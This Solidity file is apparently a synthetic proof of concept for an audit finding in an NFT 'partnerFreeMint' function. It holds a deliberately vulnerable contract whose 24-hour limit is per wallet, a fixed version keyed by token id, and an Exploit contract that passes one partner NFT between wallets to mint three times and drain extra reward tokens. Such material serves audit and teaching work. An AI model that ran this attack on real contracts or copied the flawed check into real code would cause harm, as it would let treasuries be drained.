// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Heurist partnerFreeMint — the 24h limit is per wallet, not per partner
    token id (Zokyo, finding 37688).

    SYNTHETIC, cheatcode-free reduction. One partner NFT is transferred to two
    fresh wallets. Each wallet's lastMinted is zero, so each mints immediately.
    Three NFTs are minted and 3 reward tokens leave a treasury that should
    have paid for one mint. run() does not warp. */

contract Reward {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PartnerNFT {
    mapping(uint256 => address) public ownerOf;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 id) external {
        require(ownerOf[id] == address(0), "exists");
        ownerOf[id] = to;
        balanceOf[to] += 1;
    }

    function transfer(address to, uint256 id) external {
        require(ownerOf[id] == msg.sender, "owner");
        balanceOf[msg.sender] -= 1;
        balanceOf[to] += 1;
        ownerOf[id] = to;
    }
}

contract Collection {
    PartnerNFT public partner;
    Reward public reward;
    uint256 public minted;
    mapping(address => uint256) public lastMinted;

    constructor(PartnerNFT partner_, Reward reward_) {
        partner = partner_;
        reward = reward_;
    }

    function partnerFreeMint(address to) external {
        require(partner.balanceOf(msg.sender) > 0, "partner");
        require(lastMinted[msg.sender] == 0 || block.timestamp >= lastMinted[msg.sender] + 1 days, "24h");
        // @> VULN: lastMinted is per wallet, so the partner token id is never checked
        lastMinted[msg.sender] = block.timestamp == 0 ? 1 : block.timestamp;
        minted += 1;
        reward.transfer(to, 1 ether);
    }
}

contract CollectionFixed {
    PartnerNFT public partner;
    Reward public reward;
    mapping(uint256 => uint256) public lastMintedId;

    constructor(PartnerNFT partner_, Reward reward_) {
        partner = partner_;
        reward = reward_;
    }

    function partnerFreeMint(address to, uint256 id) external {
        require(partner.ownerOf(id) == msg.sender, "owner");
        require(lastMintedId[id] == 0 || block.timestamp >= lastMintedId[id] + 1 days, "24h");
        lastMintedId[id] = block.timestamp == 0 ? 1 : block.timestamp;
        reward.transfer(to, 1 ether);
    }
}

contract Wallet {
    Collection public collection;
    PartnerNFT public partner;

    constructor(Collection collection_, PartnerNFT partner_) {
        collection = collection_;
        partner = partner_;
    }

    function give(address to, uint256 id) external {
        partner.transfer(to, id);
    }

    function mint(address loot) external {
        collection.partnerFreeMint(loot);
    }
}

contract Exploit {
    uint256 public constant MINTED = 3 ether;
    uint256 public constant FAIR = 1 ether;
    uint256 public constant EXTRA = 2 ether;

    PartnerNFT public partner;
    Reward public reward;
    Collection public collection;
    Wallet public second;
    Wallet public third;
    uint256 public mintedCount;
    uint256 public lootBalance;

    constructor() {
        partner = new PartnerNFT();
        reward = new Reward();
        collection = new Collection(partner, reward);
        reward.mint(address(collection), 3 ether);
        partner.mint(address(this), 1);
        second = new Wallet(collection, partner);
        third = new Wallet(collection, partner);
    }

    function run() external {
        collection.partnerFreeMint(address(this));
        partner.transfer(address(second), 1);
        second.mint(address(this));
        second.give(address(third), 1);
        third.mint(address(this));
        mintedCount = collection.minted();
        lootBalance = reward.balanceOf(address(this));
        require(mintedCount == 3, "three mints");
        require(lootBalance == MINTED, "loot");
        require(lootBalance - FAIR == EXTRA, "extra");
    }
}
